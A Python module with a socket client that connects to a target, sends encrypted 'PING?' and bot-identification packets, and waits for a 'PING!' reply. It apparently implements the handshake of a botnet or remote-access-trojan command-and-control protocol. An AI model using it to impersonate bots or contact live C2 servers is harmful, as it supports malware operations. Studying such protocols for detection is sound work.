import socket
import time
from utils import (
    random_str, encrypt_data, decrypt_data,
    add_metadata, parse_packet, generate_info_packet
)

class Server:
    def __init__(self, target):
        self.target = target
        self.sock = None
        self.handshake_timeout = 20
        self.connection_timeout = 5.0
    
    def connect(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(self.connection_timeout)
            
            resolved_ip = socket.gethostbyname(self.target.ip)
            
            self.sock.connect((resolved_ip, self.target.port))
            return True
        except:
            return False
    
    def send_ping(self):
        ping_packet = "PING?"
        encrypted = encrypt_data(ping_packet.encode(), self.target.key)
        encrypted = add_metadata(encrypted)
        self.sock.sendall(encrypted)
    
    def verify_handshake(self, botid):
        try:
            info_packet = generate_info_packet(botid, self.target.delimiter)
            encrypted = encrypt_data(info_packet.encode(), self.target.key)
            encrypted = add_metadata(encrypted)
            self.sock.sendall(encrypted)
            
            time.sleep(0.1)
            
            ping_packet = "PING?"
            encrypted_ping = encrypt_data(ping_packet.encode(), self.target.key)
            encrypted_ping = add_metadata(encrypted_ping)
            self.sock.sendall(encrypted_ping)
            
            self.sock.settimeout(self.handshake_timeout)
            buffer = b''
            start_time = time.time()
            
            while time.time() - start_time < self.handshake_timeout:
                try:
                    data = self.sock.recv(4096)
                    if not data:
                        return False, b''
                    
                    buffer += data
                    
                    encrypted_packet, remaining = parse_packet(buffer)
                    if encrypted_packet:
                        decrypted = decrypt_data(encrypted_packet, self.target.key)
                        if decrypted:
                            decrypted_str = decrypted.decode('utf-8', errors='ignore')
                            if decrypted_str == "PING!":
                                return True, remaining
                            elif decrypted_str and len(decrypted_str) > 0:
                                return True, remaining
                except socket.timeout:
                    continue
                except:
                    return False, b''
            
            return False, b''
        except:
            return False, b''
    
    def receive(self, timeout=1.0):
        self.sock.settimeout(timeout)
        return self.sock.recv(4096)
    
    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
            self.sock = None